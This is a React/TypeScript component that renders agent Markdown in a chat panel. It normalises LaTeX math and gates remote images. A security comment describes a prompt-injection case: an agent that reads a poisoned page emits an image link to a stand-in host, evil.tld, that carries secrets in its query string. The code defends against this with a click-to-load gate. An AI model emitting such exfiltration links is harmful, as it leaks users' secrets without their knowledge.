import { memo, useState } from "react";
import ReactMarkdown, { type Components, type Options } from "react-markdown";
import remarkBreaks from "remark-breaks";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import rehypeKatex from "rehype-katex";
import { ImageOff } from "lucide-react";
import { cn } from "@/lib/utils";
// Bundled, not a CDN link: the panel has to render math offline. KaTeX's stylesheet
// declares no colors, so formulas inherit the bubble's text color in both themes.
import "katex/dist/katex.min.css";

/**
 * `singleDollarTextMath: false` — a single `$…$` is NOT math here.
 *
 * remark-math's default is greedy in exactly the way that hurts a chat log:
 * "it costs $5 and $10 today" parses `$5 and $` as a formula and the sentence
 * turns into gibberish. Agents talk about money far more often than they write
 * bare `$x$`, so single dollars stay literal. `$$…$$` (inline and display) and
 * the LaTeX delimiters below still render.
 */
const plugins: Options["remarkPlugins"] = [remarkGfm, remarkBreaks, [remarkMath, { singleDollarTextMath: false }]];

// `errorColor` (not a stylesheet override) so a malformed formula is legible red on
// both themes; `throwOnError: false` is KaTeX's default but is stated for the same
// reason the guard exists — a bad formula must not take the transcript down.
const rehypePlugins: Options["rehypePlugins"] = [[rehypeKatex, { throwOnError: false, errorColor: "#e5484d" }]];
/** Same pipeline without the math passes — see the `math` prop on `Markdown`. */
const plainPlugins: Options["remarkPlugins"] = [remarkGfm, remarkBreaks];

/**
 * Rewrite LaTeX delimiters to dollar math before parsing.
 *
 * This cannot be done in a plugin: CommonMark eats `\(` as an escaped `(` during
 * parse, so by the time there is an mdast the delimiters are already gone.
 * The split keeps code spans and fences (odd indices) untouched.
 *
 * ponytail: regex, not a parser. `\(` inside a *indented* code block still gets
 * rewritten — switch to a micromark extension if that ever shows up for real.
 */
function normalizeMath(md: string): string {
  // A streamed reply is re-rendered on every chunk, so this runs constantly
  // against *partial* markdown. The split below only recognises a fenced block
  // when its closing ``` has arrived; while a fence is still open the regex
  // falls through to the inline-code alternative and the block's contents get
  // treated as prose — rewriting `\(x\)` inside a code sample into a formula
  // that snaps back once the fence closes. So: cut the input at the last
  // unterminated fence and leave that tail untouched.
  const fences = md.match(/```/g)?.length ?? 0;
  if (fences % 2 === 1) {
    const open = md.lastIndexOf("```");
    return normalizeMath(md.slice(0, open)) + md.slice(open);
  }
  return md
    .split(/(```[\s\S]*?```|`[^`\n]*`)/g)
    .map((part, i) =>
      i % 2 === 1
        ? part
        : part
            .replace(/\\\[([\s\S]+?)\\\]/g, (_, m: string) => `\n$$\n${m.trim()}\n$$\n`)
            .replace(/\\\(([\s\S]+?)\\\)/g, (_, m: string) => `$$${m}$$`),
    )
    .join("");
}

/**
 * The host a src would be fetched from, or `null` if it is ours.
 *
 * SECURITY: this is an exfiltration gate. Agent text is not trusted — an agent
 * that ingests an injected web page can emit `![](https://evil.tld/p.png?d=…)`
 * and a plain <img> fires that GET, secrets in the query string and all, with
 * no user action and nothing on screen. Anything not same-origin is held behind
 * a click. Same-origin (`/api/v1/files/…`) is our own API and renders directly.
 */
function remoteHost(src: string): string | null {
  try {
    const url = new URL(src, window.location.href);
    if (url.origin === window.location.origin) return null;
    // `data:`/`blob:` have no host — name the scheme so the prompt isn't blank.
    return url.host || url.protocol.replace(":", "");
  } catch {
    return "an unknown source"; // unparseable — treat as hostile
  }
}

function MarkdownImage({ src, alt, title }: { src?: string; alt?: string; title?: string }) {
  const [load, setLoad] = useState(false);
  if (!src) return null;
  const host = remoteHost(src);
  if (load || !host) {
    return (
      <img
        src={src}
        alt={alt ?? ""}
        title={title}
        loading="lazy"
        // Don't leak which conversation asked for it.
        referrerPolicy="no-referrer"
        className="max-w-full rounded-md border border-border"
      />
    );
  }
  return (
    <button
      type="button"
      onClick={() => setLoad(true)}
      title={src}
      className="flex max-w-full items-center gap-2 rounded-md border border-dashed border-border px-2.5 py-2 text-left text-xs text-muted-foreground transition-colors hover:bg-accent hover:text-foreground"
    >
      <ImageOff className="size-3.5 shrink-0" />
      <span className="min-w-0 flex-1 truncate">
        {alt ? `${alt} — ` : ""}load image from {host}
      </span>
    </button>
  );
}

const components: Components = {
  h1: ({ children }) => <h1 className="text-base font-semibold">{children}</h1>,
  h2: ({ children }) => <h2 className="text-sm font-semibold">{children}</h2>,
  h3: ({ children }) => <h3 className="text-sm font-semibold">{children}</h3>,
  h4: ({ children }) => <h4 className="text-sm font-medium">{children}</h4>,
  p: ({ children }) => <p className="leading-relaxed">{children}</p>,
  ul: ({ children }) => <ul className="list-disc space-y-1 pl-5">{children}</ul>,
  ol: ({ children }) => <ol className="list-decimal space-y-1 pl-5">{children}</ol>,
  a: ({ href, children }) => (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer"
      className="font-medium underline underline-offset-2 hover:opacity-80"
    >
      {children}
    </a>
  ),
  blockquote: ({ children }) => (
    <blockquote className="border-l-2 border-border pl-3 text-muted-foreground">
      {children}
    </blockquote>
  ),
  code: ({ className, children }) => (
    <code className={cn("rounded bg-foreground/10 px-1 py-0.5 font-mono text-xs", className)}>
      {children}
    </code>
  ),
  // A fence without a language yields <code> with no className, so inline code can't be
  // told apart there — instead the inline chip styling is reset for any code inside <pre>.
  pre: ({ children }) => (
    <pre className="overflow-x-auto rounded-md bg-foreground/5 p-2.5 text-xs [&_code]:rounded-none [&_code]:bg-transparent [&_code]:p-0">
      {children}
    </pre>
  ),
  table: ({ children }) => (
    <div className="overflow-x-auto">
      <table className="w-full border-collapse text-xs">{children}</table>
    </div>
  ),
  th: ({ children }) => (
    <th className="border border-border px-2 py-1 text-left font-medium">{children}</th>
  ),
  td: ({ children }) => <td className="border border-border px-2 py-1">{children}</td>,
  hr: () => <hr className="border-border" />,
  img: ({ src, alt, title }) => (
    <MarkdownImage src={typeof src === "string" ? src : undefined} alt={alt} title={title} />
  ),
};

/**
 * Renders agent/assistant markdown inside a chat bubble. Styles are scoped via
 * component overrides (not the typography plugin) so they inherit the bubble's
 * text color and stay compact at text-sm. Memoized so settled messages don't
 * re-parse while a new reply streams in.
 *
 * Agent text is untrusted: raw HTML is never parsed (no `rehype-raw`) and
 * `urlTransform` stays at react-markdown's safe default, so script injection is
 * closed; remote images are gated behind a click (see {@link remoteHost}).
 */
export const Markdown = memo(function Markdown({
  children,
  className,
  math = true,
}: {
  children: string;
  className?: string;
  /**
   * Render LaTeX. Pass `false` for text that is still streaming: the whole
   * string is re-normalised and re-parsed (KaTeX included) on every chunk,
   * which is O(n²) over a long reply. The settled bubble renders with math on.
   */
  math?: boolean;
}) {
  return (
    <div
      className={cn(
        "space-y-2 break-words [&_.katex-display]:overflow-x-auto [&_.katex-display]:py-1",
        className,
      )}
    >
      <ReactMarkdown
        remarkPlugins={math ? plugins : plainPlugins}
        rehypePlugins={math ? rehypePlugins : undefined}
        components={components}
      >
        {math ? normalizeMath(children) : children}
      </ReactMarkdown>
    </div>
  );
});
